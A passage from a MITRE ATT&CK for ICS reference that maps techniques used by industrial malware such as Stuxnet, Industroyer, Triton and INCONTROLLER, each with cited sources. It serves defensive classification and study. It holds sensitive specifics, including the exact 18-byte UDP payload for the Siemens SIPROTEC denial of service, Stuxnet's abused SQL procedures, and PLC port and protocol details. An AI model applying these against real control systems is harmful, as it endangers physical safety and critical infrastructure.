- T0866 - Exploitation of Remote Services: [Stuxnet](https://attack.mitre.org/software/S0603) executes malicious SQL commands in the WinCC database server to propagate to remote systems. The malicious SQL commands include xp_cmdshell, sp_dumpdbilog, and sp_addextendedproc. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0867 - Lateral Tool Transfer: [Stuxnet](https://attack.mitre.org/software/S0603) sends an SQL statement that creates a table and inserts a binary value into the table. The binary value is a hex string representation of the main Stuxnet DLL as an executable file (formed using resource 210) and an updated configuration data block. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0869 - Standard Application Layer Protocol: [Stuxnet](https://attack.mitre.org/software/S0603) uses a thread to monitor a data block DB890 of sequence A or B. This thread is constantly running and probing this block (every 5 minutes). On an infected PLC, if block DB890 is found and contains a special magic value (used by Stuxnet to identify his own block DB890), this blocks data can be read and written. This thread is likely used to optimize the way sequences A and B work, and modify their behavior when the Step7 editor is opened. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0873 - Project File Infection: [Stuxnet](https://attack.mitre.org/software/S0603) copies itself into Step 7 projects in such a way that it automatically executes when the Step 7 project is loaded. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0874 - Hooking: [Stuxnet](https://attack.mitre.org/software/S0603) modifies the Import Address Tables DLLs to hook specific APIs that are used to open project files. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0877 - I/O Image: [Stuxnet](https://attack.mitre.org/software/S0603) copies the input area of an I/O image into data blocks with a one second interval between copies, forming a 21 second recording of the input area. The input area contains information being passed to the PLC from a peripheral. For example, the current state of a valve or the temperature of a device. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0885 - Commonly Used Port: [Stuxnet](https://attack.mitre.org/software/S0603) attempts to contact command and control servers on port 80 to send basic information about the computer it has compromised. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0886 - Remote Services: [Stuxnet](https://attack.mitre.org/software/S0603) executes malicious SQL commands in the WinCC database server to propagate to remote systems. The malicious SQL commands include xp_cmdshell, sp_dumpdbilog, and sp_addextendedproc. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0888 - Remote System Information Discovery: [Stuxnet](https://attack.mitre.org/software/S0603) enumerates and parses the System Data Blocks (SDB) using the s7blk_findfirst and s7blk_findnext API calls in s7otbxdx.dll. Stuxnet must find an SDB with the DWORD at offset 50h equal to 0100CB2Ch. This specifies that the system uses the Profibus communications processor module CP 342-5. In addition, specific values are searched for and counted: 7050h and 9500h. 7050h is assigned to part number KFC750V3 which appears to be a frequency converter drive (also known as variable frequency drive) manufactured by Fararo Paya in Teheran, Iran. 9500h is assigned to Vacon NX frequency converter drives manufactured by Vacon based in Finland.(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

[Stuxnet](https://attack.mitre.org/software/S0603) was specifically targeting CPUs 6ES7-315-2 (Series 300) with special system data block characteristics for sequence A or B and 6ES7-315-2 for sequence C. The PLC type can also be checked using the s7ag_read_szl API.(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0889 - Modify Program: [Stuxnet](https://attack.mitre.org/software/S0603) infects PLCs with different code depending on the characteristics of the target system. An infection sequence consists of code blocks and data blocks that will be downloaded to the PLC to alter its behavior. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0891 - Hardcoded Credentials: [Stuxnet](https://attack.mitre.org/software/S0603) uses a hardcoded password in the WinCC software's database server as one of the mechanisms used to propagate to nearby systems. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

## Industroyer

- T0800 - Activate Firmware Update Mode: The [Industroyer](https://attack.mitre.org/software/S0604) SIPROTEC DoS module places the victim device into firmware update mode. This is a legitimate use case under normal circumstances, but in this case is used the adversary to prevent the SIPROTEC from performing its designed protective functions. As a result the normal safeguards are disabled, leaving an unprotected link in the electric transmission. (Citation: Joe Slowik August 2019)

- T0801 - Monitor Process State: [Industroyer](https://attack.mitre.org/software/S0604)'s OPC and IEC 61850 protocol modules include the ability to send stVal requests to read the status of operational variables. (Citation: Anton Cherepanov, ESET June 2017)

- T0802 - Automated Collection: [Industroyer](https://attack.mitre.org/software/S0604) automatically collects protocol object data to learn about control devices in the environment. (Citation: Anton Cherepanov, ESET June 2017)

- T0803 - Block Command Message: In [Industroyer](https://attack.mitre.org/software/S0604) the first COM port from the configuration file is used for the actual communication and the two other COM ports are just opened to prevent other processes accessing them. Thus, the IEC 101 payload component is able to take over and maintain control of the RTU device. (Citation: Anton Cherepanov, ESET June 2017)

- T0804 - Block Reporting Message: [Industroyer](https://attack.mitre.org/software/S0604) uses the first COM port from the configuration file for the communication and the other two COM ports are opened to prevent other processes accessing them. This may block processes or operators from getting reporting messages from a device. (Citation: Anton Cherepanov, ESET June 2017)

- T0805 - Block Serial COM: In [Industroyer](https://attack.mitre.org/software/S0604) the first COM port from the configuration file is used for the actual communication and the two other COM ports are just opened to prevent other processes accessing them. Thus, the IEC 101 payload component is able to take over and maintain control of the RTU device. (Citation: Anton Cherepanov, ESET June 2017)

- T0806 - Brute Force I/O: The [Industroyer](https://attack.mitre.org/software/S0604) IEC 104 module has 3 modes available to perform its attack. These modes are range, shift, and sequence. The range mode operates in 2 stages. The first stage of range mode gathers Information Object Addresses (IOA) and sends select and execute packets to switch the state. The second stage of range mode has an infinite loop where it will switch the state of all of the previously discovered IOAs. Shift mode is similar to range mode, but instead of staying within the same range, it will add a shift value to the default range values. (Citation: Anton Cherepanov, ESET June 2017)

- T0807 - Command-Line Interface: The name of the [Industroyer](https://attack.mitre.org/software/S0604) payload DLL is supplied by the attackers via a command line parameter supplied in one of the main backdoors execute a shell command commands. (Citation: Anton Cherepanov, ESET June 2017)

- T0809 - Data Destruction: [Industroyer](https://attack.mitre.org/software/S0604) has a destructive wiper that overwrites all ICS configuration files across the hard drives and all mapped network drives specifically targeting ABB PCM600 configuration files. (Citation: Dragos Inc. June 2017)

- T0813 - Denial of Control: [Industroyer](https://attack.mitre.org/software/S0604) is able to block serial COM channels temporarily causing a denial of control. (Citation: Anton Cherepanov, ESET June 2017)

- T0814 - Denial of Service: The [Industroyer](https://attack.mitre.org/software/S0604) SIPROTEC DoS module exploits the CVE-2015-5374 vulnerability in order to render a Siemens SIPROTEC device unresponsive. Once this vulnerability is successfully exploited, the target device stops responding to any commands until it is rebooted manually. (Citation: Anton Cherepanov, ESET June 2017) Once the tool is executed it sends specifically crafted packets to port 50,000 of the target IP addresses using UDP. The UDP packet contains the following 18 byte payload: 0x11 49 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 9E. (Citation: Anton Cherepanov, ESET June 2017)

- T0815 - Denial of View: [Industroyer](https://attack.mitre.org/software/S0604) is able to block serial COM channels temporarily causing a denial of view. (Citation: Anton Cherepanov, ESET June 2017)

- T0816 - Device Restart/Shutdown: The [Industroyer](https://attack.mitre.org/software/S0604) SIPROTEC DoS module exploits the CVE-2015-5374 vulnerability in order to render a Siemens SIPROTEC device unresponsive. While the vulnerability does not directly cause the restart or shutdown of the device, the device must be restarted manually before it can resume operations. (Citation: Anton Cherepanov, ESET June 2017)

- T0827 - Loss of Control: [Industroyer](https://attack.mitre.org/software/S0604)'s data wiper component removes the registry image path throughout the system and overwrites all files, rendering the system unusable. (Citation: Anton Cherepanov, ESET June 2017)

- T0829 - Loss of View: [Industroyer](https://attack.mitre.org/software/S0604)'s data wiper component removes the registry image path throughout the system and overwrites all files, rendering the system unusable. (Citation: Anton Cherepanov, ESET June 2017)

- T0831 - Manipulation of Control: [Industroyer](https://attack.mitre.org/software/S0604) toggles breakers to the open state utilizing unauthorized command messages. (Citation: Anton Cherepanov, ESET June 2017)

- T0832 - Manipulation of View: [Industroyer](https://attack.mitre.org/software/S0604)'s OPC module can brute force values and will send out a 0x01 status which for the target systems equates to a Primary Variable Out of Limits misdirecting operators from understanding protective relay status. (Citation: Anton Cherepanov, ESET June 2017)

- T0837 - Loss of Protection: [Industroyer](https://attack.mitre.org/software/S0604) contained a module which leveraged a vulnerability in the Siemens SIPROTEC relays (CVE-2015-5374) to create a Denial of Service against automated protective relays. (Citation: Joe Slowik August 2019)

- T0840 - Network Connection Enumeration: [Industroyer](https://attack.mitre.org/software/S0604) contains an IEC 61850 module that enumerates all connected network adapters to determine their TCP/IP subnet masks. (Citation: Anton Cherepanov, ESET June 2017)

- T0846 - Remote System Discovery: The [Industroyer](https://attack.mitre.org/software/S0604) IEC 61850 payload component has the ability to discover relevant devices in the infected host's network subnet by attempting to connect on port 102.(Citation: Anton Cherepanov, ESET June 2017)

[Industroyer](https://attack.mitre.org/software/S0604) contains an OPC DA module that enumerates all OPC servers using the `ICatInformation::EnumClassesOfCategories` method with `CATID_OPCDAServer20` category identifier and `IOPCServer::GetStatus` to identify the ones running.

- T0855 - Unauthorized Command Message: Using its protocol payloads, [Industroyer](https://attack.mitre.org/software/S0604) sends unauthorized commands to RTUs to change the state of equipment. (Citation: Anton Cherepanov, ESET June 2017)

- T0881 - Service Stop: [Industroyer](https://attack.mitre.org/software/S0604) has the capability to stop a service itself, or to login as a user and stop a service as that user. (Citation: Anton Cherepanov, ESET June 2017)

- T0884 - Connection Proxy: [Industroyer](https://attack.mitre.org/software/S0604) attempts to connect with a hardcoded internal proxy on TCP 3128 [default Squid proxy]. If established, the backdoor attempts to reach an external C2 server via the internal proxy. (Citation: Dragos Inc. June 2017)

- T0888 - Remote System Information Discovery: The [Industroyer](https://attack.mitre.org/software/S0604) IEC 61850 component sends the domain-specific MMSgetNameList request to determine what logical nodes the device supports. It then searches the logical nodes for the CSW value, which indicates the device performs a circuit breaker or switch control function.(Citation: ESET Industroyer)

[Industroyer](https://attack.mitre.org/software/S0604)'s OPC DA module also uses IOPCBrowseServerAddressSpace to look for items with the following strings: ctlSelOn, ctlOperOn, ctlSelOff, ctlOperOff, Pos and stVal.(Citation: ESET Industroyer)

[Industroyer](https://attack.mitre.org/software/S0604) IEC 60870-5-104 module includes a range mode to discover Information Object Addresses (IOAs) by enumerating through each.(Citation: ESET Industroyer)

## EKANS

- T0828 - Loss of Productivity and Revenue: [EKANS](https://attack.mitre.org/software/S0605) infection resulted in a temporary production loss within a Honda manufacturing plant. (Citation: Davey Winder June 2020)

- T0840 - Network Connection Enumeration: [EKANS](https://attack.mitre.org/software/S0605) performs a DNS lookup of an internal domain name associated with its target network to identify if it was deployed on the intended system. (Citation: Ben Hunter and Fred Gutierrez July 2020)

- T0849 - Masquerading: [EKANS](https://attack.mitre.org/software/S0605) masquerades itself as a valid executable with the filename update.exe. Many valid programs use the process name update.exe to perform background software updates. (Citation: Dragos Threat Intelligence February 2020)

- T0881 - Service Stop: Before encrypting the process, [EKANS](https://attack.mitre.org/software/S0605) first kills the process if its name matches one of the processes defined on the kill-list.  (Citation: Daniel Kapellmann Zafra, Keith Lunden, Nathan Brubaker, Jeremy Kennelly July 2020) (Citation: Daniel Kapellmann Zafra, Keith Lunden, Nathan Brubaker, Jeremy Kennelly July 2020) EKANS also utilizes netsh commands to implement firewall rules that blocks any remote communication with the device. (Citation: Ben Hunter and Fred Gutierrez July 2020)

## Bad Rabbit

- T0817 - Drive-by Compromise: [Bad Rabbit](https://attack.mitre.org/software/S0606) ransomware spreads through drive-by attacks where insecure websites are compromised. While the target is visiting a legitimate website, a malware dropper is being downloaded from the threat actors infrastructure. (Citation: Orkhan Mamedov, Fedor Sinitsyn, Anton Ivanov October 2017)

- T0828 - Loss of Productivity and Revenue: Several transportation organizations in Ukraine have suffered from being infected by [Bad Rabbit](https://attack.mitre.org/software/S0606), resulting in some computers becoming encrypted, according to media reports. (Citation: ESET Bad Rabbit)

- T0863 - User Execution: [Bad Rabbit](https://attack.mitre.org/software/S0606) is disguised as an Adobe Flash installer. When the file is opened it starts locking the infected computer. (Citation: Orkhan Mamedov, Fedor Sinitsyn, Anton Ivanov October 2017)

- T0866 - Exploitation of Remote Services: [Bad Rabbit](https://attack.mitre.org/software/S0606) initially infected IT networks, but by means of an exploit (particularly the SMBv1-targeting MS17-010 vulnerability) spread to industrial networks. (Citation: Joe Slowik April 2019)

- T0867 - Lateral Tool Transfer: [Bad Rabbit](https://attack.mitre.org/software/S0606) can move laterally through industrial networks by means of the SMB service. (Citation: Joe Slowik April 2019)

## KillDisk

- T0809 - Data Destruction: [KillDisk](https://attack.mitre.org/software/S0607) is able to delete system files to make the system unbootable and targets 35 different types of files for deletion. (Citation: Anton Cherepanov)

- T0829 - Loss of View: [KillDisk](https://attack.mitre.org/software/S0607) erases the master boot record (MBR) and system logs, leaving the system unusable. (Citation: Booz Allen Hamilton)

- T0872 - Indicator Removal on Host: [KillDisk](https://attack.mitre.org/software/S0607) deletes application, security, setup, and system event logs from Windows systems. (Citation: Anton Cherepanov)

- T0881 - Service Stop: [KillDisk](https://attack.mitre.org/software/S0607) looks for and terminates two non-standard processes, one of which is an ICS application. (Citation: Anton Cherepanov)

## Conficker

- T0826 - Loss of Availability: A [Conficker](https://attack.mitre.org/software/S0608) infection at a nuclear power plant forced the facility to temporarily shutdown. (Citation: Catalin Cimpanu April 2016)

- T0828 - Loss of Productivity and Revenue: A [Conficker](https://attack.mitre.org/software/S0608) infection at a nuclear power plant forced the facility to shutdown and go through security procedures involved with such events, with its staff scanning computer systems and going through all the regular checks and motions before putting the plant back into production. (Citation: Catalin Cimpanu April 2016)

- T0847 - Replication Through Removable Media: [Conficker](https://attack.mitre.org/software/S0608) exploits Windows drive shares. Once it has infected a computer, [Conficker](https://attack.mitre.org/software/S0608) automatically copies itself to all visible open drive shares on other computers inside the network. (Citation: Symantec June 2015) Nuclear power plant officials suspect someone brought in [Conficker](https://attack.mitre.org/software/S0608) by accident on a USB thumb drive, either from home or computers found in the power plant's facility. (Citation: Catalin Cimpanu April 2016)

## ACAD/Medre.A

- T0882 - Theft of Operational Information: [ACAD/Medre.A](https://attack.mitre.org/software/S1000) can collect AutoCad files with drawings. These drawings may contain operational information. (Citation: ESET)


- T0893 - Data from Local System: [ACAD/Medre.A](https://attack.mitre.org/software/S1000) collects information related to the AutoCAD application. The worm collects AutoCAD (*.dwg) files with drawings from infected systems. (Citation: ESET)

## PLC-Blaster

- T0814 - Denial of Service: The execution on the PLC can be stopped by violating the cycle time limit. The [PLC-Blaster](https://attack.mitre.org/software/S1006) implements an endless loop triggering an error condition within the PLC with the impact of a DoS. (Citation: Spenneberg, Ralf, Maik Brggemann, and Hendrik Schwartke March 2016)

- T0821 - Modify Controller Tasking: [PLC-Blaster](https://attack.mitre.org/software/S1006)'s code is stored in OB9999. The original code on the target is untouched. The OB is automatically detected by the PLC and executed. (Citation: Spenneberg, Ralf, Maik Brggemann, and Hendrik Schwartke March 2016)

- T0834 - Native API: [PLC-Blaster](https://attack.mitre.org/software/S1006) uses the system function blocks TCON and TDISCON to initiate and destroy TCP connections to arbitrary systems. Buffers may be sent and received on these connections with TRCV und TSEND system function blocks. (Citation: Spenneberg, Ralf, Maik Brggemann, and Hendrik Schwartke March 2016)

- T0835 - Manipulate I/O Image: [PLC-Blaster](https://attack.mitre.org/software/S1006) may manipulate any outputs of the PLC. Using the POU POKE any value within the process image may be modified. (Citation: Spenneberg, Ralf, Maik Brggemann, and Hendrik Schwartke March 2016)

- T0843 - Program Download: [PLC-Blaster](https://attack.mitre.org/software/S1006) utilizes the PLC communication and management API to load executable Program Organization Units. (Citation: Spenneberg, Ralf, Maik Brggemann, and Hendrik Schwartke March 2016)

- T0846 - Remote System Discovery: [PLC-Blaster](https://attack.mitre.org/software/S1006) scans the network to find other Siemens S7 PLC devices to infect. It locates these devices by checking for a service listening on TCP port 102. (Citation: Spenneberg, Ralf, Maik Brggemann, and Hendrik Schwartke March 2016)

- T0858 - Change Operating Mode: [PLC-Blaster](https://attack.mitre.org/software/S1006) stops the execution of the user program on the target to enable the transfer of its own code. The worm then copies itself to the target and subsequently starts the target PLC again. (Citation: Spenneberg, Ralf, Maik Brggemann, and Hendrik Schwartke March 2016)

- T0889 - Modify Program: [PLC-Blaster](https://attack.mitre.org/software/S1006) copies itself to various Program Organization Units (POU) on the target device.  The POUs include the Data Block, Function, and Function Block. (Citation: Spenneberg, Ralf, Maik Brggemann, and Hendrik Schwartke March 2016)

## Triton

- T0820 - Exploitation for Evasion: [Triton](https://attack.mitre.org/software/S1009) disables a firmware RAM/ROM consistency check after injects a payload (imain.bin) into the firmware memory region. (Citation: DHS CISA February 2019) (Citation: ICS-CERT December 2018) (Citation: Schneider Electric January 2018) Triconex systems include continuous means of detection including checksums for firmware and program integrity, memory and memory reference integrity, and configuration. (Citation: The Office of Nuclear Reactor Regulation)

- T0821 - Modify Controller Tasking: [Triton](https://attack.mitre.org/software/S1009)'s argument-setting and inject.bin shellcode are added to the program table on the Tricon so that they are executed by the firmware once each cycle. (Citation: DHS CISA February 2019) (Citation: Jos Wetzels January 2018)

- T0834 - Native API: [Triton](https://attack.mitre.org/software/S1009)'s imain.bin payload takes commands from the TsHi.ExplReadRam(Ex), TsHi.ExplWriteRam(Ex) and TsHi.ExplExec functions to perform operations on controller memory and registers using syscalls written in PowerPC shellcode. (Citation: Jos Wetzels January 2018)

- T0843 - Program Download: [Triton](https://attack.mitre.org/software/S1009) leveraged the TriStation protocol to download programs onto Triconex Safety Instrumented System. (Citation: Jos Wetzels January 2018)

- T0845 - Program Upload: [Triton](https://attack.mitre.org/software/S1009) calls the SafeAppendProgramMod to transfer its payloads to the Tricon. Part of this call includes preforming a program upload. (Citation: MDudek-ICS)

- T0846 - Remote System Discovery: [Triton](https://attack.mitre.org/software/S1009) uses a Python script that is capable of detecting Triconex controllers on the network by sending a specific UDP broadcast packet over port 1502. (Citation: DHS CISA February 2019)

- T0849 - Masquerading: [Triton](https://attack.mitre.org/software/S1009)'s injector, inject.bin, masquerades as a standard compiled PowerPC program for the Tricon. (Citation: DHS CISA February 2019)

[Triton](https://attack.mitre.org/software/S1009) was configured to masquerade as trilog.exe, which is the Triconex software for analyzing SIS logs.(Citation: FireEye TRITON)

- T0853 - Scripting: [Triton](https://attack.mitre.org/software/S1009) communicates with Triconex controllers using a custom component framework written entirely in Python. The modules that implement the TriStation communication protocol and other supporting components are found in a separate file -- library.zip -- the main script that employs this functionality is compiled into a standalone py2exe Windows executable -- trilog.exe  which includes a Python environment. (Citation: DHS CISA February 2019)

- T0857 - System Firmware: [Triton](https://attack.mitre.org/software/S1009) is able to read, write and execute code in memory on the safety controller at an arbitrary address within the devices firmware region. This allows the malware to make changes to the running firmware in memory and  modify how the device operates. (Citation: DHS CISA February 2019)

- T0858 - Change Operating Mode: [Triton](https://attack.mitre.org/software/S1009) has the ability to halt or run a program through the TriStation protocol. TsHi.py contains instances of halt and run functions being executed. (Citation: MDudek-ICS)

- T0868 - Detect Operating Mode: [Triton](https://attack.mitre.org/software/S1009) contains a file named TS_cnames.py which contains default definitions for program state (TS_progstate). Program state is referenced in TsHi.py.(Citation: MDudek-ICS)

[Triton](https://attack.mitre.org/software/S1009) contains a file named TS_cnames.py which contains default definitions for key state (TS_keystate). Key state is referenced in TsHi.py.(Citation: MDudek-ICS)

- T0869 - Standard Application Layer Protocol: [Triton](https://attack.mitre.org/software/S1009) can communicate with the implant utilizing the TriStation 'get main processor diagnostic data' command and looks for a specifically crafted packet body from which it extracts a command value and its arguments. (Citation: Jos Wetzels January 2018)

- T0871 - Execution through API: [Triton](https://attack.mitre.org/software/S1009) leverages a reconstructed TriStation protocol within its framework to trigger APIs related to program download, program allocation, and program changes. (Citation: Jos Wetzels January 2018)

- T0872 - Indicator Removal on Host: [Triton](https://attack.mitre.org/software/S1009) would reset the controller to the previous state over TriStation and if this failed it would write a dummy program to memory in what was likely an attempt at anti-forensics. (Citation: Jos Wetzels January 2018)

- T0874 - Hooking: [Triton](https://attack.mitre.org/software/S1009)'s injector, inject.bin, changes the function pointer of the 'get main processor diagnostic data' TriStation command to the address of imain.bin so that it is executed prior to the normal handler. (Citation: Jos Wetzels January 2018)

- T0880 - Loss of Safety: [Triton](https://attack.mitre.org/software/S1009) has the capability to reprogram the SIS logic to allow unsafe conditions to persist or reprogram the SIS to allow an unsafe state  while using the DCS to create an unsafe state or hazard. (Citation: Blake Johnson, Dan Caban, Marina Krotofil, Dan Scali, Nathan Brubaker, Christopher Glyer December 2017)

- T0885 - Commonly Used Port: [Triton](https://attack.mitre.org/software/S1009) uses TriStations default UDP port, 1502, to communicate with devices. (Citation: MDudek-ICS)

- T0890 - Exploitation for Privilege Escalation: [Triton](https://attack.mitre.org/software/S1009) leverages a previously-unknown vulnerability affecting Tricon MP3008 firmware versions 10.010.4 allows an insecurely-written system call to be exploited to achieve an arbitrary 2-byte write primitive, which is then used to gain supervisor privileges. (Citation: DHS CISA February 2019)

## VPNFilter

- T0830 - Adversary-in-the-Middle: The [VPNFilter](https://attack.mitre.org/software/S1010)'s ssler module configures the device's iptables to redirect all traffic destined for port 80 to its local service listening on port 8888. Any outgoing web requests on port 80 are now intercepted by ssler and can be inspected by the ps module and manipulated before being sent to the legitimate HTTP service. (Citation: William Largent June 2018) (Citation: Carl Hurd March 2019)

- T0842 - Network Sniffing: The [VPNFilter](https://attack.mitre.org/software/S1010) packet sniffer looks for basic authentication as well as monitors ICS traffic, and is specific to the TP-LINK R600-VPN. The malware uses a raw socket to look for connections to a pre-specified IP address, only looking at TCP packets that are 150 bytes or larger. Packets that are not on port 502, are scanned for BasicAuth, and that information is logged. This may have allowed credential harvesting from communications between devices accessing a modbus-enabled HMI. (Citation: William Largent June 2018) (Citation: Carl Hurd March 2019)

## INCONTROLLER

- T0809 - Data Destruction: [INCONTROLLER](https://attack.mitre.org/software/S1045) can wipe the memory of Omron PLCs and reset settings through the remote HTTP service.(Citation: Brubaker-Incontroller)(Citation: Dragos-Pipedream)(Citation: Wylie-22) 

- T0836 - Modify Parameter: [INCONTROLLER](https://attack.mitre.org/software/S1045) can use the HTTP CGI scripts on Omron PLCs to modify parameters on EtherCat connected servo drives.(Citation: Wylie-22) 

- T0842 - Network Sniffing: [INCONTROLLER](https://attack.mitre.org/software/S1045) can deploy Tcpdump to sniff network traffic and collect PCAP files.(Citation: Wylie-22) 

- T0843 - Program Download: [INCONTROLLER](https://attack.mitre.org/software/S1045) can use the CODESYS protocol to download programs to Schneider PLCs.(Citation: Wylie-22)(Citation: Brubaker-Incontroller) 

[INCONTROLLER](https://attack.mitre.org/software/S1045) can modified program logic on Omron PLCs using either the program download or backup transfer functions available through the HTTP server.(Citation: Wylie-22) 

- T0845 - Program Upload: [INCONTROLLER](https://attack.mitre.org/software/S1045)  can use the CODESYS protocol to upload programs from Schneider PLCs.(Citation: Wylie-22)(Citation: Brubaker-Incontroller) 

[INCONTROLLER](https://attack.mitre.org/software/S1045)  can obtain existing program logic from Omron PLCs by using either the program upload or backup functions available through the HTTP server.(Citation: Wylie-22) 

- T0846 - Remote System Discovery: [INCONTROLLER](https://attack.mitre.org/software/S1045) can perform a UDP multicast scan of UDP port 27127 to identify Schneider PLCs that use that port for the NetManage protocol.(Citation: Dragos-Pipedream)(Citation: Wylie-22)

[INCONTROLLER](https://attack.mitre.org/software/S1045) can use the FINS (Factory Interface Network Service) protocol to scan for and obtain MAC address associated with Omron devices.(Citation: CISA-AA22-103A)(Citation: Wylie-22)

[INCONTROLLER](https://attack.mitre.org/software/S1045) has the ability to perform scans for TCP port 4840 to identify devices running OPC UA servers.(Citation: Wylie-22)

- T0855 - Unauthorized Command Message: [INCONTROLLER](https://attack.mitre.org/software/S1045) can send custom Modbus commands to write register values on Schneider PLCs.(Citation: CISA-AA22-103A) 

[INCONTROLLER](https://attack.mitre.org/software/S1045) can send write tag values on OPC UA servers.(Citation: CISA-AA22-103A) 

- T0858 - Change Operating Mode: [INCONTROLLER](https://attack.mitre.org/software/S1045) can establish a remote HTTP connection to change the operating mode of Omron PLCs.(Citation: Dragos-Pipedream)(Citation: Wylie-22) 

- T0859 - Valid Accounts: [INCONTROLLER](https://attack.mitre.org/software/S1045)  can brute force password-based authentication to Schneider PLCs over  the CODESYS protocol (UDP port 1740).(Citation: CISA-AA22-103A)

 [INCONTROLLER](https://attack.mitre.org/software/S1045)  can perform brute force guessing of passwords to OPC UA servers using a predefined list of passwords.(Citation: CISA-AA22-103A)(Citation: Wylie-22) 

- T0861 - Point & Tag Identification: [INCONTROLLER](https://attack.mitre.org/software/S1045) can remotely read the OCP UA structure from devices.(Citation: CISA-AA22-103A) 

- T0867 - Lateral Tool Transfer: [INCONTROLLER](https://attack.mitre.org/software/S1045) can use a Telnet session to load a malware implant on Omron PLCs.(Citation: CISA-AA22-103A)(Citation: Wylie-22) 

- T0869 - Standard Application Layer Protocol: [INCONTROLLER](https://attack.mitre.org/software/S1045) can remotely send commands to a malicious agent uploaded on Omron PLCs over HTTP or HTTPS.(Citation: CISA-AA22-103A) 

- T0884 - Connection Proxy: The [INCONTROLLER](https://attack.mitre.org/software/S1045) PLCProxy module can add an IP route to the CODESYS gateway running on Schneider PLCs to allow it to route messages through the PLC to other devices on that network. This allows the malware to bypass firewall rules that prevent it from directly communicating with devices on the same network as the PLC.(Citation: Wylie-22)

- T0886 - Remote Services: [INCONTROLLER](https://attack.mitre.org/software/S1045) can use the CODESYS protocol to remotely connect to Schneider PLCs and perform maintenance functions on the device.(Citation: Wylie-22)

[INCONTROLLER](https://attack.mitre.org/software/S1045) can use Telnet to upload payloads and execute commands on Omron PLCs.	(Citation: Brubaker-Incontroller)(Citation: Dragos-Pipedream) The malware can also use HTTP-based CGI scripts (e.g., cpu.fcgi, ecat.fcgi) to gain administrative access to the device.(Citation: Wylie-22) 

- T0888 - Remote System Information Discovery: [INCONTROLLER](https://attack.mitre.org/software/S1045) includes a library that creates Modbus connections with a device to request its device ID.(Citation: CISA-AA22-103A)(Citation: Wylie-22) 

- T0890 - Exploitation for Privilege Escalation: [INCONTROLLER](https://attack.mitre.org/software/S1045) has the ability to exploit a vulnerable Asrock driver (AsrDrv103.sys) using CVE-2020-15368 to load its own unsigned driver on the system.(Citation: Wylie-22)

- T0891 - Hardcoded Credentials: [INCONTROLLER](https://attack.mitre.org/software/S1045) can login to Omron PLCs using hardcoded credentials, which is documented in CVE-2022-34151.(Citation: Wylie-22) 

## Industroyer2

- T0801 - Monitor Process State: [Industroyer2](https://attack.mitre.org/software/S1072) uses a General Interrogation command to monitor the device’s Information Object Addresses (IOAs) and their IO state values.(Citation: Industroyer2 Forescout July 2022)

- T0802 - Automated Collection: [Industroyer2](https://attack.mitre.org/software/S1072) leverages a hardcoded list of remote-station IP addresses to iteratively initiate communications and collect information across multiple priority IEC-104 priority levels.(Citation: Industroyer2 Forescout July 2022)

- T0806 - Brute Force I/O: [Industroyer2](https://attack.mitre.org/software/S1072) can iterate across a device’s IOAs to modify the ON/OFF value of a given IO state.(Citation: Industroyer2 Mandiant April 2022)(Citation: Industroyer2 Forescout July 2022)

- T0836 - Modify Parameter: [Industroyer2](https://attack.mitre.org/software/S1072) modifies specified Information Object Addresses (IOAs) for specified Application Service Data Unit (ASDU) addresses to either the ON or OFF state.(Citation: Industroyer2 Mandiant April 2022)(Citation: Industroyer2 Forescout July 2022)

- T0855 - Unauthorized Command Message: [Industroyer2](https://attack.mitre.org/software/S1072) is capable of sending command messages from the compromised device to target remote stations to open data channels, retrieve the location and values of Information Object Addresses (IOAs), and modify the IO state values through Select Before Operate I/O, Select/Execute, and Invert Default State operations.(Citation: Industroyer2 Mandiant April 2022)(Citation: Industroyer2 Forescout July 2022)

- T0881 - Service Stop: [Industroyer2](https://attack.mitre.org/software/S1072) has the capability to terminate specified processes (i.e., PServiceControl.exe and PService_PDD.exe) and rename each process to prevent restart. These are defined through a hardcoded configuration.(Citation: Industroyer2 Mandiant April 2022)

- T0888 - Remote System Information Discovery: [Industroyer2](https://attack.mitre.org/software/S1072) has the capability to poll a target device about its connection status, data transfer status, Common Address (CA), Information Object Addresses (IOAs), and IO state values across multiple priority levels.(Citation: Industroyer2 Forescout July 2022)(Citation: Industroyer2 ESET April 2022)

## Fuxnet

- T0806 - Brute Force I/O: [Fuxnet](https://attack.mitre.org/software/S1157) repeatedly wrote arbitrary data over the Meter-Bus channel from impacted devices to connected sensors to render sensor data acquisition useless.(Citation: Claroty Fuxnet 2024)

- T0809 - Data Destruction: [Fuxnet](https://attack.mitre.org/software/S1157) physically destroyed NAND memory chips on impacted devices through repeated bit-flip operations.(Citation: Claroty Fuxnet 2024)

- T0814 - Denial of Service: [Fuxnet](https://attack.mitre.org/software/S1157) shut down remote access services such as SSH, HTTP, telnet, and SNMP to a device along with deleting the routing table for routing devices to inhibit system accessibility and communication.(Citation: Claroty Fuxnet 2024)

- T0822 - External Remote Services: [Fuxnet](https://attack.mitre.org/software/S1157) initial execution relied on accessing external remote services for victim environments.(Citation: Claroty Fuxnet 2024)

- T0829 - Loss of View: [Fuxnet](https://attack.mitre.org/software/S1157) impaired sensor communication to impacted devices resulting in a loss of view condition for overall system monitoring.(Citation: Claroty Fuxnet 2024)

- T0883 - Internet Accessible Device: [Fuxnet](https://attack.mitre.org/software/S1157) execution relied upon accessing Internet-accessible devices for initial access and deployment.(Citation: Claroty Fuxnet 2024)

## FrostyGoop

- T0801 - Monitor Process State: [FrostyGoop](https://attack.mitre.org/software/S1165) can read data from holding registers via Modbus communication.(Citation: Dragos FROSTYGOOP 2024)

- T0807 - Command-Line Interface: [FrostyGoop](https://attack.mitre.org/software/S1165) is compiled for Windows systems and leverages a Windows-based command line interface.(Citation: Dragos FROSTYGOOP 2024) Modbus interaction functionality is based off a publicly available Github repository for command line input.(Citation: Nozomi BUSTLEBERM 2024)

